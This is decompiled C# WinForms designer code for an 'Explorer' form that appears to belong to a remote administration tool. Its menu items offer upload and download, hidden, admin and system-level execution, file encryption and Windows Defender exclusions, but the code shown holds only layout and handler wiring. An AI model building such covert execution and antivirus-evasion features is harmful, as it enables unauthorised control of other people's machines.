			this.excuteToolStripMenuItem.Name = "excuteToolStripMenuItem";
			this.excuteToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.excuteToolStripMenuItem.Text = "Execute";
			this.excuteToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("excuteToolStripMenuItem1.Image");
			this.excuteToolStripMenuItem1.Name = "excuteToolStripMenuItem1";
			this.excuteToolStripMenuItem1.Size = new global::System.Drawing.Size(180, 22);
			this.excuteToolStripMenuItem1.Text = "Execute";
			this.excuteToolStripMenuItem1.Click += new global::System.EventHandler(this.excuteToolStripMenuItem1_Click);
			this.executeToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("executeToolStripMenuItem.Image");
			this.executeToolStripMenuItem.Name = "executeToolStripMenuItem";
			this.executeToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.executeToolStripMenuItem.Text = "Execute Hidden";
			this.executeToolStripMenuItem.Click += new global::System.EventHandler(this.executeToolStripMenuItem_Click);
			this.executeToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("executeToolStripMenuItem1.Image");
			this.executeToolStripMenuItem1.Name = "executeToolStripMenuItem1";
			this.executeToolStripMenuItem1.Size = new global::System.Drawing.Size(180, 22);
			this.executeToolStripMenuItem1.Text = "Execute Admin";
			this.executeToolStripMenuItem1.Click += new global::System.EventHandler(this.executeToolStripMenuItem1_Click);
			this.executeToolStripMenuItem2.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("executeToolStripMenuItem2.Image");
			this.executeToolStripMenuItem2.Name = "executeToolStripMenuItem2";
			this.executeToolStripMenuItem2.Size = new global::System.Drawing.Size(180, 22);
			this.executeToolStripMenuItem2.Text = "Execute System";
			this.executeToolStripMenuItem2.Click += new global::System.EventHandler(this.executeToolStripMenuItem2_Click);
			this.attributesToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.normalToolStripMenuItem,
				this.hiddenToolStripMenuItem,
				this.systemToolStripMenuItem,
				this.directoryToolStripMenuItem,
				this.lockRemoveToolStripMenuItem,
				this.unlockRemoveToolStripMenuItem
			});
			this.attributesToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("attributesToolStripMenuItem.Image");
			this.attributesToolStripMenuItem.Name = "attributesToolStripMenuItem";
			this.attributesToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.attributesToolStripMenuItem.Text = "Attributes";
			this.normalToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("normalToolStripMenuItem.Image");
			this.normalToolStripMenuItem.Name = "normalToolStripMenuItem";
			this.normalToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.normalToolStripMenuItem.Text = "Normal";
			this.normalToolStripMenuItem.Click += new global::System.EventHandler(this.normalToolStripMenuItem_Click);
			this.hiddenToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("hiddenToolStripMenuItem.Image");
			this.hiddenToolStripMenuItem.Name = "hiddenToolStripMenuItem";
			this.hiddenToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.hiddenToolStripMenuItem.Text = "Hidden";
			this.hiddenToolStripMenuItem.Click += new global::System.EventHandler(this.hiddenToolStripMenuItem_Click);
			this.systemToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("systemToolStripMenuItem.Image");
			this.systemToolStripMenuItem.Name = "systemToolStripMenuItem";
			this.systemToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.systemToolStripMenuItem.Text = "System";
			this.systemToolStripMenuItem.Click += new global::System.EventHandler(this.systemToolStripMenuItem_Click);
			this.directoryToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("directoryToolStripMenuItem.Image");
			this.directoryToolStripMenuItem.Name = "directoryToolStripMenuItem";
			this.directoryToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.directoryToolStripMenuItem.Text = "Directory";
			this.directoryToolStripMenuItem.Click += new global::System.EventHandler(this.directoryToolStripMenuItem_Click);
			this.lockRemoveToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("lockRemoveToolStripMenuItem.Image");
			this.lockRemoveToolStripMenuItem.Name = "lockRemoveToolStripMenuItem";
			this.lockRemoveToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.lockRemoveToolStripMenuItem.Text = "Lock remove";
			this.lockRemoveToolStripMenuItem.Click += new global::System.EventHandler(this.lockRemoveToolStripMenuItem_Click);
			this.unlockRemoveToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("unlockRemoveToolStripMenuItem.Image");
			this.unlockRemoveToolStripMenuItem.Name = "unlockRemoveToolStripMenuItem";
			this.unlockRemoveToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.unlockRemoveToolStripMenuItem.Text = "Unlock remove";
			this.unlockRemoveToolStripMenuItem.Click += new global::System.EventHandler(this.unlockRemoveToolStripMenuItem_Click);
			this.cryptoToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.encryptToolStripMenuItem,
				this.decryptToolStripMenuItem
			});
			this.cryptoToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("cryptoToolStripMenuItem.Image");
			this.cryptoToolStripMenuItem.Name = "cryptoToolStripMenuItem";
			this.cryptoToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.cryptoToolStripMenuItem.Text = "Crypto";
			this.encryptToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("encryptToolStripMenuItem.Image");
			this.encryptToolStripMenuItem.Name = "encryptToolStripMenuItem";
			this.encryptToolStripMenuItem.Size = new global::System.Drawing.Size(115, 22);
			this.encryptToolStripMenuItem.Text = "Encrypt";
			this.encryptToolStripMenuItem.Click += new global::System.EventHandler(this.encryptToolStripMenuItem_Click);
			this.decryptToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("decryptToolStripMenuItem.Image");
			this.decryptToolStripMenuItem.Name = "decryptToolStripMenuItem";
			this.decryptToolStripMenuItem.Size = new global::System.Drawing.Size(115, 22);
			this.decryptToolStripMenuItem.Text = "Decrypt";
			this.decryptToolStripMenuItem.Click += new global::System.EventHandler(this.decryptToolStripMenuItem_Click);
			this.defenderToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.execlitToolStripMenuItem,
				this.removeExclusionToolStripMenuItem
			});
			this.defenderToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("defenderToolStripMenuItem.Image");
			this.defenderToolStripMenuItem.Name = "defenderToolStripMenuItem";
			this.defenderToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.defenderToolStripMenuItem.Text = "Defender";
			this.execlitToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("execlitToolStripMenuItem.Image");
			this.execlitToolStripMenuItem.Name = "execlitToolStripMenuItem";
			this.execlitToolStripMenuItem.Size = new global::System.Drawing.Size(170, 22);
			this.execlitToolStripMenuItem.Text = "Exclusion";
			this.execlitToolStripMenuItem.Click += new global::System.EventHandler(this.execlitToolStripMenuItem_Click);
			this.removeExclusionToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("removeExclusionToolStripMenuItem.Image");
			this.removeExclusionToolStripMenuItem.Name = "removeExclusionToolStripMenuItem";
			this.removeExclusionToolStripMenuItem.Size = new global::System.Drawing.Size(170, 22);
			this.removeExclusionToolStripMenuItem.Text = "Remove Exclusion";
			this.removeExclusionToolStripMenuItem.Click += new global::System.EventHandler(this.removeExclusionToolStripMenuItem_Click);
			this.rjTextBox1.BackColor = global::System.Drawing.SystemColors.Window;
			this.rjTextBox1.BorderColor = global::System.Drawing.SystemColors.Window;
			this.rjTextBox1.BorderFocusColor = global::System.Drawing.SystemColors.Window;
			this.rjTextBox1.BorderRadius = 0;
			this.rjTextBox1.BorderSize = 1;
			this.rjTextBox1.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.rjTextBox1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.5f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.rjTextBox1.ForeColor = global::System.Drawing.Color.FromArgb(64, 64, 64);
			this.rjTextBox1.Location = new global::System.Drawing.Point(0, 0);
			this.rjTextBox1.Margin = new global::System.Windows.Forms.Padding(4);
			this.rjTextBox1.Multiline = false;
			this.rjTextBox1.Name = "rjTextBox1";
			this.rjTextBox1.Padding = new global::System.Windows.Forms.Padding(10, 7, 10, 7);
			this.rjTextBox1.PasswordChar = false;
			this.rjTextBox1.PlaceholderColor = global::System.Drawing.Color.DarkGray;
			this.rjTextBox1.PlaceholderText = "";
			this.rjTextBox1.Size = new global::System.Drawing.Size(575, 31);
			this.rjTextBox1.TabIndex = 1;
			this.rjTextBox1.Texts = "";
			this.rjTextBox1.UnderlinedStyle = false;
			this.panel3.Controls.Add(this.materialLabel1);
			this.panel3.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.panel3.Location = new global::System.Drawing.Point(0, 550);
			this.panel3.Name = "panel3";
			this.panel3.Size = new global::System.Drawing.Size(575, 23);
			this.panel3.TabIndex = 0;
			this.materialLabel1.AutoSize = true;
			this.materialLabel1.Depth = 0;
			this.materialLabel1.Font = new global::System.Drawing.Font("Roboto", 14f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Pixel);
			this.materialLabel1.Location = new global::System.Drawing.Point(6, 3);
			this.materialLabel1.MouseState = global::MaterialSkin.MouseState.HOVER;
			this.materialLabel1.Name = "materialLabel1";
			this.materialLabel1.Size = new global::System.Drawing.Size(94, 19);
			this.materialLabel1.TabIndex = 0;
			this.materialLabel1.Text = "Please wait...";
			this.imageList1.ImageStream = (global::System.Windows.Forms.ImageListStreamer)componentResourceManager.GetObject("imageList1.ImageStream");
			this.imageList1.TransparentColor = global::System.Drawing.Color.Transparent;
			this.imageList1.Images.SetKeyName(0, "folder.png");
			this.imageList1.Images.SetKeyName(1, "usb-drive.png");
			this.imageList1.Images.SetKeyName(2, "hard-disk.png");
			this.panel4.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.panel4.Location = new global::System.Drawing.Point(3, 64);
			this.panel4.Name = "panel4";
			this.panel4.Size = new global::System.Drawing.Size(794, 573);
			this.panel4.TabIndex = 2;
			this.timer1.Interval = 1000;
			this.timer1.Tick += new global::System.EventHandler(this.timer1_Tick);
			this.audioToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("audioToolStripMenuItem.Image");
			this.audioToolStripMenuItem.Name = "audioToolStripMenuItem";
			this.audioToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.audioToolStripMenuItem.Text = "Audio";
			this.audioToolStripMenuItem.Click += new global::System.EventHandler(this.audioToolStripMenuItem_Click);
			this.wallpaperToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("wallpaperToolStripMenuItem.Image");
			this.wallpaperToolStripMenuItem.Name = "wallpaperToolStripMenuItem";
			this.wallpaperToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.wallpaperToolStripMenuItem.Text = "Change Wallpaper";
			this.wallpaperToolStripMenuItem.Click += new global::System.EventHandler(this.wallpaperToolStripMenuItem_Click);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.White;
			base.ClientSize = new global::System.Drawing.Size(800, 640);
			base.Controls.Add(this.panel2);
			base.Controls.Add(this.panel1);
			base.Controls.Add(this.panel4);
			base.Name = "FormExplorer";
			this.Text = "Explorer";
			base.Load += new global::System.EventHandler(this.FormExplorer_Load);
			this.panel1.ResumeLayout(false);
			((global::System.ComponentModel.ISupportInitialize)this.dataGridView3).EndInit();
			((global::System.ComponentModel.ISupportInitialize)this.dataGridView1).EndInit();
			this.panel2.ResumeLayout(false);
			((global::System.ComponentModel.ISupportInitialize)this.dataGridView2).EndInit();
			this.contextMenuStrip1.ResumeLayout(false);
			this.panel3.ResumeLayout(false);
			this.panel3.PerformLayout();
			base.ResumeLayout(false);
		}

		// Token: 0x040003BC RID: 956
		private global::System.ComponentModel.IContainer components;

		// Token: 0x040003BD RID: 957
		private global::System.Windows.Forms.Panel panel1;

		// Token: 0x040003BE RID: 958
		private global::System.Windows.Forms.Panel panel2;

		// Token: 0x040003BF RID: 959
		private global::System.Windows.Forms.Panel panel3;

		// Token: 0x040003C0 RID: 960
		private global::System.Windows.Forms.DataGridViewImageColumn Column2;

		// Token: 0x040003C1 RID: 961
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Column1;

		// Token: 0x040003C2 RID: 962
		private global::System.Windows.Forms.DataGridViewImageColumn Column3;

		// Token: 0x040003C3 RID: 963
		private global::System.Windows.Forms.DataGridViewTextBoxColumn dataGridViewTextBoxColumn1;

		// Token: 0x040003C4 RID: 964
		public global::System.Windows.Forms.DataGridView dataGridView1;

		// Token: 0x040003C5 RID: 965
		public global::System.Windows.Forms.DataGridView dataGridView3;

		// Token: 0x040003C6 RID: 966
		public global::System.Windows.Forms.DataGridView dataGridView2;

		// Token: 0x040003C7 RID: 967
		public global::System.Windows.Forms.ImageList imageList1;

		// Token: 0x040003C8 RID: 968
		private global::System.Windows.Forms.ContextMenuStrip contextMenuStrip1;

		// Token: 0x040003C9 RID: 969
		private global::System.Windows.Forms.ToolStripMenuItem backToolStripMenuItem;

		// Token: 0x040003CA RID: 970
		public global::MaterialSkin.Controls.MaterialLabel materialLabel1;

		// Token: 0x040003CB RID: 971
		public global::CustomControls.RJControls.RJTextBox rjTextBox1;

		// Token: 0x040003CC RID: 972
		private global::System.Windows.Forms.Panel panel4;

		// Token: 0x040003CD RID: 973
		private global::System.Windows.Forms.ToolStripMenuItem refreshToolStripMenuItem;

		// Token: 0x040003CE RID: 974
		public global::System.Windows.Forms.Timer timer1;

		// Token: 0x040003CF RID: 975
		private global::System.Windows.Forms.ToolStripMenuItem createFolderToolStripMenuItem;

		// Token: 0x040003D0 RID: 976
		private global::System.Windows.Forms.ToolStripMenuItem upDownToolStripMenuItem;

		// Token: 0x040003D1 RID: 977
		private global::System.Windows.Forms.ToolStripMenuItem uploadToolStripMenuItem;

		// Token: 0x040003D2 RID: 978
		private global::System.Windows.Forms.ToolStripMenuItem downloadToolStripMenuItem;

		// Token: 0x040003D3 RID: 979
		private global::System.Windows.Forms.ToolStripMenuItem createFileToolStripMenuItem;

		// Token: 0x040003D4 RID: 980
		private global::System.Windows.Forms.ToolStripMenuItem createFolderToolStripMenuItem1;

		// Token: 0x040003D5 RID: 981
		private global::System.Windows.Forms.ToolStripMenuItem renameToolStripMenuItem;

		// Token: 0x040003D6 RID: 982
		private global::System.Windows.Forms.ToolStripMenuItem removeToolStripMenuItem;

		// Token: 0x040003D7 RID: 983
		private global::System.Windows.Forms.ToolStripMenuItem copyToolStripMenuItem;

		// Token: 0x040003D8 RID: 984
		private global::System.Windows.Forms.ToolStripMenuItem pasteToolStripMenuItem;

		// Token: 0x040003D9 RID: 985
		private global::System.Windows.Forms.ToolStripMenuItem cutToolStripMenuItem;

		// Token: 0x040003DA RID: 986
		private global::System.Windows.Forms.ToolStripMenuItem zipToolStripMenuItem;

		// Token: 0x040003DB RID: 987
		private global::System.Windows.Forms.ToolStripMenuItem unzipToolStripMenuItem;

		// Token: 0x040003DC RID: 988
		private global::System.Windows.Forms.ToolStripMenuItem zipToolStripMenuItem1;

		// Token: 0x040003DD RID: 989
		private global::System.Windows.Forms.ToolStripMenuItem excuteToolStripMenuItem;

		// Token: 0x040003DE RID: 990
		private global::System.Windows.Forms.ToolStripMenuItem excuteToolStripMenuItem1;

		// Token: 0x040003DF RID: 991
		private global::System.Windows.Forms.ToolStripMenuItem executeToolStripMenuItem;

		// Token: 0x040003E0 RID: 992
		private global::System.Windows.Forms.ToolStripMenuItem executeToolStripMenuItem1;

		// Token: 0x040003E1 RID: 993
		private global::System.Windows.Forms.ToolStripMenuItem executeToolStripMenuItem2;

		// Token: 0x040003E2 RID: 994
		private global::System.Windows.Forms.ToolStripMenuItem attributesToolStripMenuItem;

		// Token: 0x040003E3 RID: 995
		private global::System.Windows.Forms.ToolStripMenuItem hiddenToolStripMenuItem;

		// Token: 0x040003E4 RID: 996
		private global::System.Windows.Forms.ToolStripMenuItem systemToolStripMenuItem;

		// Token: 0x040003E5 RID: 997
		private global::System.Windows.Forms.ToolStripMenuItem normalToolStripMenuItem;

		// Token: 0x040003E6 RID: 998
		private global::System.Windows.Forms.ToolStripMenuItem directoryToolStripMenuItem;

		// Token: 0x040003E7 RID: 999
		private global::System.Windows.Forms.ToolStripMenuItem lockRemoveToolStripMenuItem;

		// Token: 0x040003E8 RID: 1000
		private global::System.Windows.Forms.ToolStripMenuItem unlockRemoveToolStripMenuItem;

		// Token: 0x040003E9 RID: 1001
		private global::System.Windows.Forms.DataGridViewImageColumn Column4;

		// Token: 0x040003EA RID: 1002
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Column6;

		// Token: 0x040003EB RID: 1003
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Column7;

		// Token: 0x040003EC RID: 1004
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Column5;

		// Token: 0x040003ED RID: 1005
		private global::System.Windows.Forms.DataGridViewTextBoxColumn dataGridViewTextBoxColumn2;

		// Token: 0x040003EE RID: 1006
		private global::System.Windows.Forms.ToolStripMenuItem cryptoToolStripMenuItem;

		// Token: 0x040003EF RID: 1007
		private global::System.Windows.Forms.ToolStripMenuItem encryptToolStripMenuItem;

		// Token: 0x040003F0 RID: 1008
		private global::System.Windows.Forms.ToolStripMenuItem decryptToolStripMenuItem;

		// Token: 0x040003F1 RID: 1009
		private global::System.Windows.Forms.ToolStripMenuItem defenderToolStripMenuItem;

		// Token: 0x040003F2 RID: 1010
		private global::System.Windows.Forms.ToolStripMenuItem execlitToolStripMenuItem;

		// Token: 0x040003F3 RID: 1011
		private global::System.Windows.Forms.ToolStripMenuItem removeExclusionToolStripMenuItem;

		// Token: 0x040003F4 RID: 1012
		private global::System.Windows.Forms.ToolStripMenuItem audioToolStripMenuItem;

		// Token: 0x040003F5 RID: 1013
		private global::System.Windows.Forms.ToolStripMenuItem wallpaperToolStripMenuItem;
	}
}
